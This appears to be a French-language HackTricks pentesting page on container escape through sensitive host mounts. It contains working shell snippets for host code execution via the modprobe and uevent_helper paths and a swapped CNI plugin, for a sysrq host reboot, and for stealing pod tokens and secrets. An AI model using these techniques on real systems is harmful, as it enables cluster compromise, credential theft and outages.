# Sensitive Host Mounts

{{#include ../../../banners/hacktricks-training.md}}

## Overview

Les host mounts sont l’une des surfaces pratiques les plus importantes pour l’escape de container, car ils réduisent souvent une vue de processus soigneusement isolée à une visibilité directe des ressources de l’hôte. Les cas dangereux ne se limitent pas à `/`. Les bind mounts de `/proc`, `/sys`, `/var`, des runtime sockets, de l’état géré par kubelet, ou de chemins liés aux devices peuvent exposer des contrôles du kernel, des credentials, les filesystems de containers voisins et des interfaces de gestion du runtime.

Cette page existe séparément des pages de protection individuelles parce que le modèle d’abus est transversal. Un host mount en écriture est dangereux en partie à cause des mount namespaces, en partie à cause des user namespaces, en partie à cause de la couverture AppArmor ou SELinux, et en partie à cause du chemin exact de l’hôte exposé. Le traiter comme un sujet à part rend la surface d’attaque beaucoup plus simple à comprendre.

## `/proc` Exposure

procfs contient à la fois des informations ordinaires sur les processus et des interfaces de contrôle du kernel à fort impact. Un bind mount comme `-v /proc:/host/proc` ou une vue de container qui expose des entrées proc inattendues et inscriptibles peut donc conduire à une fuite d’informations, à un denial of service, ou à une exécution directe de code sur l’hôte.

Les chemins procfs à forte valeur incluent :

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Abuse

Commencez par vérifier quelles entrées procfs à forte valeur sont visibles ou inscriptibles :
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
Ces chemins sont intéressants pour différentes raisons. `core_pattern`, `modprobe`, et `binfmt_misc` peuvent devenir des chemins d'exécution de code sur l'hôte lorsqu'ils sont inscriptibles. `kallsyms`, `kmsg`, `kcore`, et `config.gz` sont des sources puissantes de reconnaissance pour l'exploitation du kernel. `sched_debug` et `mountinfo` révèlent le contexte des process, des cgroup, et du filesystem qui peut aider à reconstituer la disposition de l'hôte depuis l'intérieur du container.

La valeur pratique de chaque chemin est différente, et les traiter tous comme s'ils avaient le même impact rend le triage plus difficile :

- `/proc/sys/kernel/core_pattern`
Si inscriptible, c'est l'un des chemins procfs à plus fort impact, car le kernel exécutera un handler pipe après un crash. Un container qui peut pointer `core_pattern` vers un payload stocké dans son overlay ou dans un chemin monté de l'hôte peut souvent obtenir une exécution de code sur l'hôte. Voir aussi [read-only-paths.md](protections/read-only-paths.md) pour un exemple dédié.
- `/proc/sys/kernel/modprobe`
Ce chemin contrôle le helper userspace utilisé par le kernel lorsqu'il doit invoquer la logique de chargement de module. S'il est inscriptible depuis le container et interprété dans le contexte de l'hôte, il peut devenir un autre primitive d'exécution de code sur l'hôte. Il est particulièrement intéressant lorsqu'il est combiné avec un moyen de déclencher le chemin du helper.
- `/proc/sys/vm/panic_on_oom`
Ce n'est généralement pas une primitive d'évasion propre, mais cela peut transformer la pression mémoire en déni de service à l'échelle de l'hôte en convertissant les conditions OOM en comportement de kernel panic.
- `/proc/sys/fs/binfmt_misc`
Si l'interface d'enregistrement est inscriptible, l'attaquant peut enregistrer un handler pour une valeur magique choisie et obtenir une exécution dans le contexte de l'hôte lorsqu'un fichier correspondant est exécuté.
- `/proc/config.gz`
Utile pour le triage d'exploitation du kernel. Cela aide à déterminer quels subsystèmes, mitigations, et fonctionnalités optionnelles du kernel sont activés sans avoir besoin des métadonnées des paquets de l'hôte.
- `/proc/sysrq-trigger`
Principalement un chemin de déni de service, mais un très sérieux. Il peut redémarrer, provoquer un panic, ou perturber l'hôte immédiatement.
- `/proc/kmsg`
Révèle les messages du ring buffer du kernel. Utile pour l'empreinte de l'hôte, l'analyse de crash, et dans certains environnements pour divulguer des informations utiles à l'exploitation du kernel.
- `/proc/kallsyms`
Précieux lorsqu'il est lisible, car il expose les informations de symboles kernel exportés et peut aider à contourner les hypothèses de randomisation d'adresses lors du développement d'un exploit kernel.
- `/proc/[pid]/mem`
Il s'agit d'une interface directe à la mémoire d'un process. Si le process cible est atteignable avec les conditions ptrace nécessaires, elle peut permettre de lire ou de modifier la mémoire d'un autre process. L'impact réaliste dépend fortement des credentials, de `hidepid`, de Yama, et des restrictions ptrace, donc c'est un chemin puissant mais conditionnel.
- `/proc/kcore`
Expose une vue de la mémoire système de type image core. Le fichier est énorme et peu pratique à utiliser, mais s'il est réellement lisible, cela indique une surface mémoire de l'hôte mal exposée.
- `/proc/kmem` and `/proc/mem`
Interfaces brutes à la mémoire historiquement à fort impact. Sur de nombreux systèmes modernes, elles sont désactivées ou fortement restreintes, mais si elles sont présentes et utilisables, elles doivent être traitées comme des findings critiques.
- `/proc/sched_debug`
Divulgue des informations de scheduling et de tâches qui peuvent exposer les identités des process de l'hôte même lorsque les autres vues des process semblent plus propres que prévu.
- `/proc/[pid]/mountinfo`
Extrêmement utile pour reconstituer où le container vit réellement sur l'hôte, quels chemins sont supportés par overlay, et si un mount inscriptible correspond à du contenu de l'hôte ou seulement à la couche du container.

Si `/proc/[pid]/mountinfo` ou les détails d'overlay sont lisibles, utilisez-les pour récupérer le chemin hôte du filesystem du container :
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
Ces commandes sont utiles, car un certain nombre de tricks d'exécution sur l'hôte nécessitent de transformer un path à l’intérieur du container en le path correspondant du point de vue de l'hôte.

### Full Example: `modprobe` Helper Path Abuse

Si `/proc/sys/kernel/modprobe` est inscriptible depuis le container et que le path du helper est interprété dans le contexte de l'hôte, il peut être redirigé vers un payload contrôlé par l'attaquant:
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```
Le déclencheur exact dépend de la cible et du comportement du kernel, mais le point important est qu’un chemin d’helper inscriptible peut rediriger une future invocation d’helper du kernel vers du contenu du host-path contrôlé par l’attaquant.

### Full Example: Kernel Recon With `kallsyms`, `kmsg`, And `config.gz`

Si l’objectif est l’évaluation de l’exploitabilité plutôt qu’une évasion immédiate :
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
Ces commandes aident à répondre à la question de savoir si des informations de symboles utiles sont visibles, si des messages récents du kernel révèlent un état intéressant, et quelles fonctionnalités ou mitigations du kernel sont compilées. L’impact n’est généralement pas une évasion directe, mais cela peut réduire fortement le triage des vulnérabilités du kernel.

### Full Example: SysRq Host Reboot

Si `/proc/sysrq-trigger` est accessible en écriture et atteint la vue de l’hôte :
```bash
echo b > /proc/sysrq-trigger
```
L’effet est immédiat : reboot de l’hôte. Ce n’est pas un exemple subtil, mais il démontre clairement que l’exposition de procfs peut être bien plus grave qu’une simple divulgation d’informations.

## `/sys` Exposure

sysfs expose de grandes quantités d’état du kernel et des devices. Certains chemins sysfs sont surtout utiles pour le fingerprinting, tandis que d’autres peuvent affecter l’exécution des helpers, le comportement des devices, la configuration des security-modules ou l’état du firmware.

Les chemins sysfs à forte valeur incluent :

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Ces chemins comptent pour différentes raisons. `/sys/class/thermal` peut influencer le comportement de la gestion thermique et donc la stabilité de l’hôte dans des environnements mal exposés. `/sys/kernel/vmcoreinfo` peut leak des informations de crash-dump et de layout du kernel qui aident au fingerprinting bas niveau de l’hôte. `/sys/kernel/security` est l’interface `securityfs` utilisée par Linux Security Modules, donc un accès inattendu peut exposer ou modifier l’état lié à MAC. Les chemins de variables EFI peuvent affecter les paramètres de boot stockés dans le firmware, ce qui les rend beaucoup plus sérieux que des fichiers de configuration ordinaires. `debugfs` sous `/sys/kernel/debug` est particulièrement dangereux car il s’agit volontairement d’une interface orientée développeur, avec beaucoup moins d’exigences de sécurité que les APIs du kernel durcies et destinées à la production.

Les commandes utiles pour examiner ces chemins sont :
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
Ce qui rend ces commandes intéressantes :

- `/sys/kernel/security` peut révéler si AppArmor, SELinux, ou une autre surface LSM est visible d’une manière qui aurait dû rester côté hôte uniquement.
- `/sys/kernel/debug` est souvent la découverte la plus alarmante dans ce groupe. Si `debugfs` est monté et lisible ou inscriptible, attendez-vous à une large surface orientée kernel dont le risque exact dépend des nœuds de débogage activés.
- L’exposition des variables EFI est moins courante, mais si elle est présente, son impact est élevé car elle touche des paramètres soutenus par le firmware plutôt que de simples fichiers d’exécution ordinaires.
- `/sys/class/thermal` est surtout pertinente pour la stabilité de l’hôte et l’interaction avec le matériel, pas pour un neat shell-style escape.
- `/sys/kernel/vmcoreinfo` est surtout une source de host-fingerprinting et d’analyse de crash, utile pour comprendre l’état bas niveau du kernel.

### Full Example: `uevent_helper`

Si `/sys/kernel/uevent_helper` est inscriptible, le kernel peut exécuter un helper contrôlé par un attaquant lorsqu’un `uevent` est déclenché :
```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```
La raison pour laquelle cela fonctionne est que le chemin du helper est interprété du point de vue de l'hôte. Une fois déclenché, le helper s'exécute dans le contexte de l'hôte plutôt qu'à l'intérieur du container actuel.

## ` /var` Exposure

Monter `/var` de l'hôte dans un container est souvent sous-estimé parce que cela ne paraît pas aussi spectaculaire que monter `/`. En pratique, cela peut suffire pour atteindre des runtime sockets, des répertoires de snapshot de container, des volumes de pod gérés par kubelet, des projected service-account tokens, et les systèmes de fichiers des applications voisines. Sur les nœuds modernes, `/var` est souvent l'endroit où se trouve réellement l'état de container le plus intéressant sur le plan opérationnel.

### Kubernetes Example

Un pod avec `hostPath: /var` peut souvent lire les projected tokens d'autres pods et le contenu des snapshots overlay:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
Ces commandes sont utiles car elles permettent de répondre à la question de savoir si le mount expose seulement des données d'application peu sensibles ou des credentials de cluster à fort impact. Un token de service-account lisible peut immédiatement transformer une local code execution en accès à Kubernetes API.

Si le token est présent, validez ce qu’il peut atteindre au lieu de vous arrêter à sa découverte du token :
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
L'impact ici peut être bien plus important qu'un accès local au node. Un token avec un RBAC large peut transformer un `/var` monté en compromission à l'échelle du cluster.

### Docker And containerd Example

Sur les hôtes Docker, les données pertinentes se trouvent souvent sous `/var/lib/docker`, tandis que sur les nodes Kubernetes basés sur containerd, elles peuvent se trouver sous `/var/lib/containerd` ou dans des chemins spécifiques au snapshotter :
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
Si le `/var` monté expose du contenu de snapshot inscriptible d’un autre workload, l’attaquant peut être en mesure de modifier des fichiers d’application, de déposer du web content, ou de changer des startup scripts sans toucher à la configuration du conteneur actuel.

Idées d’abus concrètes une fois un contenu de snapshot inscriptible trouvé :
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```
Ces commandes sont utiles car elles montrent les trois principales familles d’impact des `/var` montés : altération d’application, récupération de secrets, et mouvement latéral vers les workloads voisins.

## Kubelet State, Plugins, And CNI Paths

Un mount de `/var/lib/kubelet`, `/opt/cni/bin`, ou `/etc/cni/net.d` est souvent exposé via des DaemonSets privilégiés, des agents CNI, des plugins CSI node, des opérateurs GPU, et des assistants de stockage. Ces mounts sont faciles à écarter comme de la simple "node plumbing", mais ils se trouvent directement dans le chemin d’exécution des nouveaux pods et contiennent souvent des identifiants kubelet, des secrets projetés, des sockets d’enregistrement, et des binaires de plugins host-side exécutables.

Les cibles à forte valeur incluent :

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

Les commandes utiles de revue sont :
```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```
Pourquoi ces chemins sont importants :

- `/var/lib/kubelet/pki` peut exposer les certificats client kubelet et d'autres identifiants locaux du node qui peuvent parfois être réutilisés contre le API server ou les endpoints TLS côté kubelet, selon la conception du cluster.
- `/var/lib/kubelet/pods` contient souvent des service-account tokens projetés et des Secrets montés pour des pods voisins sur le même node.
- `/var/lib/kubelet/pod-resources/kubelet.sock` est surtout une surface de reconnaissance, mais très utile : il révèle quels pods et containers possèdent actuellement des GPUs, hugepages, des devices SR-IOV, et d'autres ressources locales rares du node.
- `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins`, et `/var/lib/kubelet/plugins_registry` révèlent quels plugins CSI, DRA, et device plugins sont installés et quels sockets le kubelet est censé contacter. Si ces répertoires sont inscriptibles plutôt que simplement lisibles, la découverte devient beaucoup plus grave.
- `/opt/cni/bin` et `/etc/cni/net.d` se trouvent directement sur le chemin de configuration du pod-network. Un accès en écriture à cet endroit est souvent une primitive d'exécution différée sur le host plutôt qu'une simple exposition de configuration.

### Full Example: Writable `/opt/cni/bin`

Si un répertoire de binaires CNI du host est monté en lecture-écriture, remplacer un plugin peut suffire à obtenir une exécution sur le host la prochaine fois que le kubelet crée un pod sandbox sur ce node :
```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > /tmp/cni-triggered
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
```
Ce n’est pas aussi immédiat qu’un `docker.sock` monté, mais c’est souvent plus réaliste dans des pods d’infrastructure Kubernetes compromis. Le point important est que le binaire modifié est ensuite exécuté par le flux de configuration du réseau hôte, et non par le conteneur actuel.


## Runtime Sockets

Les sensitive host mounts incluent souvent des runtime sockets plutôt que des répertoires complets. Ils sont si importants qu’ils méritent d’être répétés explicitement ici :
```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
Voir [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) pour les flows complets d’exploitation une fois qu’un de ces sockets est monté.

Comme premier pattern d’interaction rapide :
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
Si l’un de ceux-ci réussit, le chemin allant de "mounted socket" à "start a more privileged sibling container" est généralement beaucoup plus court que n’importe quel chemin de kernel breakout.

## Mount-Related CVEs

Les host mounts interagissent aussi avec les vulnérabilités du runtime. Exemples récents importants :

- `CVE-2024-21626` dans `runc`, où un directory file descriptor divulgué pouvait placer le working directory sur le host filesystem.
- `CVE-2024-23651`, `CVE-2024-23652` et `CVE-2024-23653` dans BuildKit, où des Dockerfiles malveillants, des frontends et des flux `RUN --mount` pouvaient réintroduire l’accès aux fichiers du host, la suppression ou des privilèges élevés pendant les builds.
- `CVE-2024-1753` dans Buildah et les build flows de Podman, où des bind mounts forgés pendant le build pouvaient exposer `/` en read-write.
- `CVE-2025-47290` dans `containerd` 2.1.0, où un TOCTOU pendant le image unpack pouvait permettre à une image spécialement forgée de modifier le host filesystem pendant le pull.

Ces CVEs sont importantes ici car elles montrent que la gestion des mounts ne dépend pas seulement de la configuration de l’opérateur. Le runtime lui-même peut aussi introduire des conditions d’évasion liées aux mounts.

## Checks

Utilisez ces commandes pour repérer rapidement les mount exposures les plus intéressantes :
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Ce qui est intéressant ici :

- Host root, `/proc`, `/sys`, `/var`, et les runtime sockets sont tous des findings à haute priorité.
- Des entrées proc/sys inscriptibles signifient souvent que le mount expose des contrôles kernel globaux de l’host plutôt qu’une vue container sûre.
- Les chemins `/var` montés méritent un review des credentials et des workloads voisins, pas seulement un review du filesystem.
- Les répertoires d’état du kubelet et les chemins CNI/plugin méritent la même priorité que les runtime sockets parce qu’ils se trouvent souvent directement sur le chemin de création des pods et de distribution des credentials du node.

## References

- [Local Files And Paths Used By The Kubelet](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [cilium-agent container can access the host via `hostPath` mount](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
{{#include ../../../banners/hacktricks-training.md}}
